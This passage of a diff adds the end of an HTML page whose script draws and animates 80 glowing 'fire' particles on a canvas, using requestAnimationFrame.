+                ctx.globalAlpha = Math.max(0, this.life);
+                ctx.fillStyle = this.color;
+                ctx.beginPath();
+                ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
+                ctx.fill();
+                
+                // Add tiny glow
+                ctx.shadowBlur = 10;
+                ctx.shadowColor = this.color;
+            }
+        }
+
+        // Init Particles (Limit to 80 for performance)
+        for(let i = 0; i < 80; i++) {
+            particles.push(new FireParticle());
+        }
+
+        // Animation Loop
+        function animate() {
+            ctx.clearRect(0, 0, width, height);
+            
+            for(let i = 0; i < particles.length; i++) {
+                particles[i].update();
+                particles[i].draw();
+            }
+            
+            requestAnimationFrame(animate);
+        }
+        animate();
+    </script>
+</body>
+</html>
